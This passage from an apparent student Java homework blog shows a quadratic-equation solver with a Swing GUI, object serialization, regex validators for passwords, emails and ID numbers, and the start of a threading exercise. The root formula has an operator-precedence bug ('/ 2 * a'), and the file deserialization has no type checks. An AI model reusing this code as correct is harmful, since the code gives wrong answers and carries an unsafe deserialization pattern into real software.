(<span class="number">2</span> * a);</span><br><span class="line">                <span class="keyword">this</span>.complex = Math.sqrt(-<span class="number">1</span> * delta) / (<span class="number">2</span> * a);</span><br><span class="line">                show = <span class="string">&quot;The equation has a pair of conjugate complex roots.\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;x1 = &quot;</span> + <span class="keyword">this</span>.real + <span class="string">&quot; + &quot;</span> + <span class="keyword">this</span>.complex + <span class="string">&quot;i\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;x2 = &quot;</span> + <span class="keyword">this</span>.real + <span class="string">&quot; - &quot;</span> + <span class="keyword">this</span>.complex + <span class="string">&quot;i&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.real = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">this</span>.complex = Math.sqrt(-<span class="number">1</span> * delta) / (<span class="number">2</span> * a);</span><br><span class="line">                show = <span class="string">&quot;The equation has a pair of opposite virtual roots.\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;x1 = 0 - &quot;</span> + <span class="keyword">this</span>.complex + <span class="string">&quot;i\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;x2 = 0 + &quot;</span> + <span class="keyword">this</span>.complex + <span class="string">&quot;i&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.x1 = ((-<span class="keyword">this</span>.b) + Math.sqrt(delta)) / <span class="number">2</span> * <span class="keyword">this</span>.a;</span><br><span class="line">            <span class="keyword">if</span> (delta == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.x2 = <span class="keyword">this</span>.x1;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.x2 = ((-<span class="keyword">this</span>.b) - Math.sqrt(delta)) / <span class="number">2</span> * <span class="keyword">this</span>.a;</span><br><span class="line">            show = <span class="string">&quot;x1 = &quot;</span> + <span class="keyword">this</span>.x1 + <span class="string">&quot;\nx2 = &quot;</span> + <span class="keyword">this</span>.x2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NonQuadraticEquationException</span> <span class="keyword">extends</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String message;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NonQuadraticEquationException</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        message = <span class="string">&quot;The input equation is not a binary linear equation!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CalcPanel</span> <span class="keyword">extends</span> <span class="title">Panel</span> </span>&#123;</span><br><span class="line">    JLabel label1, label2, label3;</span><br><span class="line">    JTextField text1, text2, text3;</span><br><span class="line">    JButton button1,button2,button3,button4;</span><br><span class="line"></span><br><span class="line">    CalcPanel() &#123;</span><br><span class="line">        <span class="keyword">this</span>.setLayout(<span class="keyword">new</span> GridLayout(<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">10</span>));</span><br><span class="line">        text1 = <span class="keyword">new</span> JTextField();</span><br><span class="line">        text1.setPreferredSize(text1.getSize());</span><br><span class="line">        text2 = <span class="keyword">new</span> JTextField();</span><br><span class="line">        text2.setPreferredSize(text1.getSize());</span><br><span class="line">        text3 = <span class="keyword">new</span> JTextField();</span><br><span class="line">        text3.setPreferredSize(text1.getSize());</span><br><span class="line">        Font font = <span class="keyword">new</span> Font(Font.SERIF, Font.PLAIN, <span class="number">20</span>);</span><br><span class="line">        label1 = <span class="keyword">new</span> JLabel(<span class="string">&quot;Quadratic Term Coefficient&quot;</span>);</span><br><span class="line">        label2 = <span class="keyword">new</span> JLabel(<span class="string">&quot;Primary Term Coefficient&quot;</span>);</span><br><span class="line">        label3 = <span class="keyword">new</span> JLabel(<span class="string">&quot;Constant Term&quot;</span>);</span><br><span class="line">        label1.setFont(font);</span><br><span class="line">        label1.setHorizontalAlignment(SwingConstants.HORIZONTAL);</span><br><span class="line">        label2.setFont(font);</span><br><span class="line">        label2.setHorizontalAlignment(SwingConstants.HORIZONTAL);</span><br><span class="line">        label3.setFont(font);</span><br><span class="line">        label3.setHorizontalAlignment(SwingConstants.HORIZONTAL);</span><br><span class="line">        button1 = <span class="keyword">new</span> JButton(<span class="string">&quot;Solve&quot;</span>);</span><br><span class="line">        button2 = <span class="keyword">new</span> JButton(<span class="string">&quot;Clear the input box&quot;</span>);</span><br><span class="line">        button3 = <span class="keyword">new</span> JButton(<span class="string">&quot;Exit&quot;</span>);</span><br><span class="line">        button4 = <span class="keyword">new</span> JButton(<span class="string">&quot;Deserialize&quot;</span>);</span><br><span class="line">        button2.setSize(<span class="number">300</span>,<span class="number">25</span>);</span><br><span class="line">        button2.addActionListener(<span class="keyword">this</span>::actionPerformedClear);</span><br><span class="line">        button3.addActionListener(<span class="keyword">this</span>::actionPerformedExit);</span><br><span class="line">        button4.addActionListener(<span class="keyword">this</span>::actionPerformedDeserialize);</span><br><span class="line"></span><br><span class="line">        add(label1);</span><br><span class="line">        add(text1);</span><br><span class="line">        add(label2);</span><br><span class="line">        add(text2);</span><br><span class="line">        add(label3);</span><br><span class="line">        add(text3);</span><br><span class="line">        add(button1);</span><br><span class="line">        add(button2);</span><br><span class="line">        add(button3);</span><br><span class="line">        add(button4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Clear</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformedClear</span><span class="params">(ActionEvent e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.text1.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.text2.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.text3.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Exit</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformedExit</span><span class="params">(ActionEvent e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = JOptionPane.showConfirmDialog(<span class="keyword">null</span>, <span class="string">&quot;Confirm to exit the interface?&quot;</span>, <span class="string">&quot;Exit&quot;</span>,JOptionPane.OK_CANCEL_OPTION,JOptionPane.INFORMATION_MESSAGE);</span><br><span class="line">        <span class="keyword">if</span> (result == JOptionPane.OK_OPTION) &#123;</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Deserialize</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformedDeserialize</span><span class="params">(ActionEvent e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>(FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;file1.data&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis)) &#123;</span><br><span class="line">            BinaryLinearEquation ex = (BinaryLinearEquation) ois.readObject();</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="keyword">null</span>,ex.getInfo(),<span class="string">&quot;Deserialized Object&quot;</span>,JOptionPane.INFORMATION_MESSAGE);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ClassNotFoundException | IOException exception)&#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="keyword">null</span>,exception.getMessage(),<span class="string">&quot;IOException&quot;</span>,JOptionPane.WARNING_MESSAGE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainPanel</span> <span class="keyword">extends</span> <span class="title">JFrame</span> <span class="keyword">implements</span> <span class="title">ActionListener</span> </span>&#123;</span><br><span class="line">    CalcPanel panel;</span><br><span class="line">    JTextArea textArea;</span><br><span class="line">    BinaryLinearEquation BLEquation;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainPanel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setLayout(<span class="keyword">new</span> BorderLayout());</span><br><span class="line">        panel = <span class="keyword">new</span> CalcPanel();</span><br><span class="line">        panel.button1.addActionListener(<span class="keyword">this</span>);</span><br><span class="line">        textArea = <span class="keyword">new</span> JTextArea();</span><br><span class="line">        textArea.setBounds(getX(), getY(), <span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">        Font font2 = <span class="keyword">new</span> Font(<span class="string">&quot;苹方&quot;</span>,Font.PLAIN,<span class="number">20</span>);</span><br><span class="line">        textArea.setFont(font2);</span><br><span class="line">        add(panel, BorderLayout.NORTH);</span><br><span class="line">        add(textArea, BorderLayout.CENTER);</span><br><span class="line">        setBounds(<span class="number">450</span>, <span class="number">300</span>, <span class="number">600</span>, <span class="number">600</span>);</span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">        setTitle(<span class="string">&quot;Binary Linear Equation Calculator&quot;</span>);</span><br><span class="line">        validate();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Solve</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>(FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;file1.data&quot;</span>);</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos)) &#123;</span><br><span class="line">            BLEquation = <span class="keyword">new</span> BinaryLinearEquation(Double.parseDouble(panel.text1.getText()), Double.parseDouble(panel.text2.getText()), Double.parseDouble(panel.text3.getText()));</span><br><span class="line">            BLEquation.Solve();</span><br><span class="line">            oos.writeObject(BLEquation);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException ioException) &#123;</span><br><span class="line">            ioException.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="keyword">null</span>,ioException.getMessage(),<span class="string">&quot;IOException&quot;</span>,JOptionPane.WARNING_MESSAGE);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NumberFormatException e1) &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="keyword">null</span>,e1.getMessage(),<span class="string">&quot;Input error!&quot;</span>,JOptionPane.ERROR_MESSAGE);</span><br><span class="line">            <span class="keyword">this</span>.textArea.setText(BinaryLinearEquation.show);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NonQuadraticEquationException e2) &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="keyword">null</span>,e2.toString(),<span class="string">&quot;Error in the form of the quadratic equation&quot;</span>,JOptionPane.ERROR_MESSAGE); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.textArea.setText(BinaryLinearEquation.show);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GUI</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> MainPanel();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果（图形化界面）：</p><ol><li>界面如下所示。<img src="/img/20e871123d20734d519e683ab4efe514.jpeg"></li></ol><p>2. 当输入为空时报错。</p><p><img src="/img/8e23ea88cd0134216e9b191aa32cca38.jpeg"></p><p>3. 求解<br>$$<br>{x^2} + x + 1 = 0<br>$$<br>提示该方程有一对共轭复根。</p><p><img src="/img/923af5e7de08718f5561d00051df8ca5.jpeg"></p><p>4.求解<br>$$<br>{x^2} + 1 = 0<br>$$<br>程序提示该方程有一对相反的虚根。</p><p><img src="/img/86c0211ed62170fcaf1ab71b522a42b5.jpeg"></p><p>5. （1）下面演示一下序列化与反序列化功能。首先求解一个方程，例如<br>$$<br>{x^2} + 192x + 123 = 0<br>$$<br>求解如下。<img src="/img/d52531376bb42f3e0ae81fbdaa8221c4.jpeg"></p><p>（2）此时生成了<code>file1.data</code>文件，作为序列化后的对象（二进制文件）。我们用十六进制编辑器打开后，如下所示。</p><p><img src="/img/9ee80191e1b841b132b3db423f55a2cf.jpeg"></p><p>（3）然后点击Deserialize按钮，进行反序列化，程序将输出原方程和方程的解，如下所示。</p><p><img src="/img/6a08a8d426769b66a3bd387638567e45.jpeg"></p><p>（4）同样的，我们还可以序列化方程<br>$$<br>{x^2} + x + 1 = 0<br>$$<br>的对象，并进行反序列化，如下所示。</p><p><img src="/img/f7932a4afda9a6dbc946db8a3237e4fd.jpeg"></p><p>6. 下面我们来演示一下异常处理。开始时已经演示过空字符异常，这里不再重复。</p><p>（1）假如我们删除<code>file1.data</code>文件，系统将会捕捉到<code>IOException</code>，效果如下所示。</p><p><img src="/img/49efc893627e64b5beeb1200e7ebf607.jpeg"></p><p>（2）如果在输入框内输入字母等非法字符，将会捕捉到<code>NumberFormatException</code>，效果如下。</p><p><img src="/img/58971a05e051820aef0c4dbdfb656f56.jpeg"></p><p>（3）如果二次项系数输入为0，则会触发我们自定义的异常：</p><p>**<code>NonQuadraticEquationException</code>**，此时不是二元一次方程，程序报错。</p><p><img src="/img/613e6d93c2f70a5774c04ef5a062a348.jpeg"></p><p>7. 点击Clear the input box按钮将会清空输入框。</p><p>8. 点击Exit将会弹出确认对话框，确认后退出程序。</p><p><img src="/img/07f348e964df8f04805726fa5d51b14a.jpeg"></p><p>代码（命令行模式）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandLineMode</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> a=<span class="number">0</span>, b=<span class="number">0</span>, c=<span class="number">0</span>;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;\n******* Binary Linear Equation Calculator *******\n&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Please input the Quadratic Term Coefficient: &quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                a = scan.nextInt();</span><br><span class="line">                System.out.println(<span class="string">&quot;Please input the Primary Term Coefficient: &quot;</span>);</span><br><span class="line">                b = scan.nextInt();</span><br><span class="line">                System.out.println(<span class="string">&quot;Please input the Constant Term: &quot;</span>);</span><br><span class="line">                c = scan.nextInt();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            BinaryLinearEquation BLEquation;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> (FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;file1.data&quot;</span>);</span><br><span class="line">                 ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos)) &#123;</span><br><span class="line">                BLEquation = <span class="keyword">new</span> BinaryLinearEquation(a, b, c);</span><br><span class="line">                BLEquation.Solve();</span><br><span class="line">                oos.writeObject(BLEquation);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ioException) &#123;</span><br><span class="line">                ioException.printStackTrace();</span><br><span class="line">                System.err.println(ioException.getMessage());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NumberFormatException e1) &#123;</span><br><span class="line">                System.err.println(e1.getMessage());</span><br><span class="line">                System.out.println(BinaryLinearEquation.show);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NonQuadraticEquationException e2) &#123;</span><br><span class="line">                System.err.println(e2.toString());</span><br><span class="line">                BinaryLinearEquation.show = <span class="string">&quot;Refuse to calculate a linear equation.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(BinaryLinearEquation.show);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果（命令行模式）：</p><p>1. 求解<br>$$<br>{x^2} + 1 = 0<br>$$<br>程序提示该方程有一对相反的虚根。<img src="/img/8f6a042a82ec96d3214f19b0cca0d7bb.png"></p><p>2. 求解<br>$$<br>{x^2} + 192x + 123 = 0<br>$$<br><img src="/img/cf02ef9332c6b62f754eae822003e25e.png"></p><p>3. 求解<br>$$<br>{x^2} + x + 1 = 0<br>$$<br><img src="/img/889436c27ff930316789d6d80d6a3d14.png"></p><ol start="4"><li><p>当二次项系数为0时，程序报错：</p><p><img src="/img/acf3c7a4181af9e41fd9fd17eb622a67.png"></p></li></ol><p>同时，命令行模式也会将序列化后的对象存入file1.data文件。</p><p><img src="/img/a0c4df0ad7c103c4176c8ea06b7129c6.png"></p><h2 id="作业四"><a href="#作业四" class="headerlink" title="作业四"></a><strong>作业四</strong></h2><h3 id="正则表达式练习"><a href="#正则表达式练习" class="headerlink" title="正则表达式练习"></a>正则表达式练习</h3><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">            System.out.println(<span class="string">&quot;Please input mode:&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;[P]Password\t\t\t\t[E]Email\n[I]Citizen ID number\t[Q]Quit&quot;</span>);</span><br><span class="line">            String mode = scanner.next();</span><br><span class="line">            <span class="keyword">if</span> (mode.equalsIgnoreCase(<span class="string">&quot;P&quot;</span>)) &#123;</span><br><span class="line">                Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">                System.out.println(<span class="string">&quot;Please input your password:&quot;</span>);</span><br><span class="line">                String pwd = sc.nextLine();</span><br><span class="line">                <span class="keyword">boolean</span> isPwdSafe = validatePassword(pwd);</span><br><span class="line">                <span class="keyword">if</span> (isPwdSafe)</span><br><span class="line">                    System.out.println(<span class="string">&quot;Your password is acceptable.&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;Your password does not meet the requirements.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (mode.equalsIgnoreCase(<span class="string">&quot;E&quot;</span>))&#123;</span><br><span class="line">                Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">                System.out.println(<span class="string">&quot;Please input your email:&quot;</span>);</span><br><span class="line">                String email = sc.nextLine();</span><br><span class="line">                <span class="keyword">boolean</span> isEmail = validateEmail(email);</span><br><span class="line">                <span class="keyword">if</span> (isEmail)</span><br><span class="line">                    System.out.println(<span class="string">&quot;Your Email address is acceptable.&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;Your Email address is not correct.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (mode.equalsIgnoreCase(<span class="string">&quot;I&quot;</span>))&#123;</span><br><span class="line">                Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">                System.out.println(<span class="string">&quot;Please input your citizen ID number:&quot;</span>);</span><br><span class="line">                String id = sc.nextLine();</span><br><span class="line">                <span class="keyword">boolean</span> isIDNum = validateID(id);</span><br><span class="line">                <span class="keyword">if</span> (isIDNum)</span><br><span class="line">                    System.out.println(<span class="string">&quot;Your citizen ID number is acceptable.&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;Your citizen ID number is not correct.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (mode.equalsIgnoreCase(<span class="string">&quot;Q&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">validatePassword</span><span class="params">(String password)</span> <span class="comment">//密码输入校验方法</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 必须包含大小写字母和数字的组合，可以使用特殊字符，长度在6-16之间</span></span><br><span class="line">        <span class="keyword">boolean</span> flag;</span><br><span class="line">        flag = password.matches(<span class="string">&quot;^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).&#123;6,16&#125;$&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">validateEmail</span><span class="params">(String email)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> flag;</span><br><span class="line">        flag = email.matches(<span class="string">&quot;^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">validateID</span><span class="params">(String IDnum)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 15位、18位</span></span><br><span class="line">        <span class="keyword">boolean</span> flag;</span><br><span class="line">        flag = IDnum.matches(<span class="string">&quot;(^[1-9]\\d&#123;5&#125;(18|19|([23]\\d))\\d&#123;2&#125;((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\\d&#123;3&#125;[0-9Xx]$)|(^[1-9]\\d&#123;5&#125;\\d&#123;2&#125;((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\\d&#123;3&#125;$)&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p>1.满足密码复杂性需求，要求至少包含大小写字母和数字，可以使用特殊字符，长度在6-16位之间。</p><p><img src="/img/604e7896a8bed985935d05e6066ba951.jpeg"></p><p>2.满足身份证号码规范，包括15位和18位。包括各部分规范检查，如月份不得大于12，每月不得多于31天，年份不得以17XX开头等。下图是18位身份证号码验证：</p><p><img src="/img/5956fa597116ad86fb24773a3478c6fe.jpeg"></p><p>下图是15位身份证号码验证：</p><p><img src="/img/280b03ae88799433bd6ebba9323c2ddf.jpeg"></p><ol start="3"><li><p>满足电子邮件规范：</p><p><img src="/img/e47e43d134ae4f8133c054170d770b0b.jpeg"></p></li></ol><h3 id="利用鼠标事件启动3个线程分别在三个窗口中同时绘制动态图形"><a href="#利用鼠标事件启动3个线程分别在三个窗口中同时绘制动态图形" class="headerlink" title="利用鼠标事件启动3个线程分别在三个窗口中同时绘制动态图形"></a>利用鼠标事件启动3个线程分别在三个窗口中同时绘制动态图形</h3><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 